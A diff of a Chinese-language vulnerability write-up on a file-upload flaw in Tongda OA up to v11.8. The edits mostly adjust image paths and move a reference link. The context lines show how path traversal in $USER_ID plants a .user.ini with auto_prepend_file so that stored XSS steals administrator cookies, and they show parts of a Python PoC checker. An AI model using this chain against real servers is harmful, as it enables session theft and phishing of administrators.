@@ -4,6 +4,10 @@
 
 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息
 
+参考阅读：
+
+- https://paper.seebug.org/1499/
+
 ## 漏洞影响
 
 ```
@@ -65,7 +69,7 @@ if ($PHOTO_NAME0 != "") {
 }
 ```
 
-![image-20220209111308741](./images/202202091113931.png)
+![image-20220209111308741](images/202202091113931.png)
 
 在这里参数 **$USER_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
 
@@ -119,21 +123,21 @@ auto_prepend_file=peiqi.log
 
 这里拼接后上传就变成了 **.user.ini**
 
-![image-20220209111339894](./images/202202091113999.png)
+![image-20220209111339894](images/202202091113999.png)
 
 这里再上传 XSS文件 **peiqi.log** 被包含进去
 
-![image-20220209111358294](./images/202202091113385.png)
+![image-20220209111358294](images/202202091113385.png)
 
 上传后每次管理员登录后都会带着Cookie请求一次XSS平台
 
-![image-20220209111423483](./images/202202091114571.png)
+![image-20220209111423483](images/202202091114571.png)
 
 钓鱼什么的代码写在peiqi.log文件里就好啦
 
 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径
 
-![image-20220209111524536](./images/202202091115646.png)
+![image-20220209111524536](images/202202091115646.png)
 
 ```php
 if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {
@@ -146,11 +150,11 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 
 路径中必须要包含  **webroot 和 attachment** 才可以上传
 
-![image-20220209111502133](./images/202202091115242.png)
+![image-20220209111502133](images/202202091115242.png)
 
 这里XSS的利用点有4个文件夹，其中最有几率XSS的为**存储目录管理的文件夹**
 
-![image-20220209111547012](./images/202202091115069.png)
+![image-20220209111547012](images/202202091115069.png)
 
 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie
 
@@ -246,7 +250,7 @@ def POC_3(target_url, Cookie):
         response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
         print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \033[0m".format(target_url))
         if "test_Wiki" in response.text and response.status_code == 200:
-            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))
+            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考阅读写的利用版本进一步攻击 \033[0m".format(target_url))
         else:
             print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\033[0m".format(target_url))
             sys.exit(0)
@@ -260,8 +264,5 @@ if __name__ == '__main__':
     POC_1(target_url, Cookie)
 ```
 
-![image-20220209111615822](./images/202202091116959.png)
+![image-20220209111615822](images/202202091116959.png)
 
-## 参考文章
-
-https://paper.seebug.org/1499/
